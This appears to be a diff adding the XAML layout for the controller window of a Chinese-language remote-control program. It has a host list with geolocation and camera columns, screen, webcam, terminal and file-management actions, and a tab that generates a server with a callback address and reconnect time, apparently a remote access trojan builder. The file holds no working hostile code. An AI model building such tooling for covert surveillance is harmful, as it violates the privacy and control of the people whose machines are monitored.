@@ -1,0 +1,83 @@
+﻿<Window x:Class="Echo.Net.Main"
+        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
+        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+        Title="远程控制" Height="600" Width="800" Loaded="Window_Loaded" FontSize="14" Closing="Window_Closing" WindowStartupLocation="CenterScreen">
+    <Grid>
+        <Grid.RowDefinitions>
+            <RowDefinition></RowDefinition>
+            <RowDefinition Height="24"></RowDefinition>
+        </Grid.RowDefinitions>
+        <TabControl Grid.Row="0">
+            <TabItem Header="主机列表" >
+                <Grid>
+                    <Grid.RowDefinitions>
+                        <RowDefinition></RowDefinition>
+                        <RowDefinition Height="100"></RowDefinition>
+                    </Grid.RowDefinitions>
+                    <ListView Grid.Row="0" Name="listView" SelectionMode="Single">
+                        <ListView.ContextMenu>
+                            <ContextMenu>
+                                <MenuItem Header="详细信息" Name="MoreInfo" Click="MenuItem_Click"></MenuItem>
+                                <MenuItem Header="文件管理" Name="File" Click="MenuItem_Click"></MenuItem>
+                                <MenuItem Header="屏幕监控" Name="Screen" Click="MenuItem_Click"></MenuItem>
+                                <MenuItem Header="视频监控" Name="Camera" Click="MenuItem_Click"></MenuItem>
+                                <MenuItem Header="远程终端" Name="Telnet" Click="MenuItem_Click"></MenuItem>
+                                <MenuItem Header="文字聊天" Name="Chat" Click="MenuItem_Click"></MenuItem>
+                                <MenuItem Header="进程管理" Name="TaskMgr" Click="MenuItem_Click"></MenuItem>
+                            </ContextMenu>
+                        </ListView.ContextMenu>
+                        <ListView.View>
+                            <GridView>
+                                <GridViewColumn Header="主机名称" DisplayMemberBinding="{Binding MachineName}" Width="100" />
+                                <GridViewColumn Header="IP地址" DisplayMemberBinding="{Binding IP}" Width="150" />
+                                <GridViewColumn Header="地理位置" DisplayMemberBinding="{Binding Addr}" Width="120" />
+                                <GridViewColumn Header="上线时间" DisplayMemberBinding="{Binding LoginTime}" Width="100" />
+                                <GridViewColumn Header="操作系统" DisplayMemberBinding="{Binding OSVersion}" Width="100" />
+                                <GridViewColumn Header="摄像头" DisplayMemberBinding="{Binding Camera}" Width="60" />
+                                <GridViewColumn Header="版本" DisplayMemberBinding="{Binding Version}" Width="60" />
+                                <GridViewColumn Header="Ping" DisplayMemberBinding="{Binding Ping}" Width="60" />
+                            </GridView>
+                        </ListView.View>
+                    </ListView>
+                    <TextBox Grid.Row="1" Name="logBox" IsReadOnly="True" VerticalScrollBarVisibility="Auto" />
+                </Grid>
+            </TabItem>
+            <TabItem Header="配置服务端">
+                <Grid Margin="100,50">
+                    <Grid.ColumnDefinitions>
+                        <ColumnDefinition Width="100"></ColumnDefinition>
+                        <ColumnDefinition></ColumnDefinition>
+                        <ColumnDefinition Width="100"></ColumnDefinition>
+                        <ColumnDefinition></ColumnDefinition>
+                    </Grid.ColumnDefinitions>
+                    <Grid.RowDefinitions>
+                        <RowDefinition Height="30" />
+                        <RowDefinition Height="30" />
+                        <RowDefinition Height="30" />
+                        <RowDefinition Height="30" />
+                        <RowDefinition Height="30" />
+                        <RowDefinition />
+                    </Grid.RowDefinitions>
+                    <Label Grid.Row="0" Grid.Column="0" Content="上线地址:" />
+                    <TextBox Grid.Row="0" Grid.Column="1" Name="IP" Margin="3" />
+                    <Label Grid.Row="1" Grid.Column="0" Content="端口:" />
+                    <TextBox Grid.Row="1" Grid.Column="1" Name="Port" Margin="3" />
+                    <Label Grid.Row="2" Grid.Column="0" Content="重连时间(秒):" />
+                    <TextBox Grid.Row="2" Grid.Column="1" Name="ReconnectSecond" Margin="3" />
+                    <Button Grid.Row="4" Grid.Column="1" Content="生成" Width="80" Height="25" HorizontalAlignment="Right" Click="ServerConfig_Click" />
+                </Grid>
+            </TabItem>
+            <TabItem Header="系统设置">
+            </TabItem>
+            <TabItem Header="关于">
+            </TabItem>
+        </TabControl>
+        <StatusBar Grid.Row="1" Name="statusBar">
+            <Label Grid.Column="0" Name="status1" Padding="0" Width="100" />
+            <Separator Width="1" />
+            <Label Grid.Column="1" Name="status2" Padding="0" Width="100" />
+            <Separator Width="1" />
+            <Label Grid.Column="1" Name="status3" Padding="0" Width="150" />
+        </StatusBar>
+    </Grid>
+</Window>
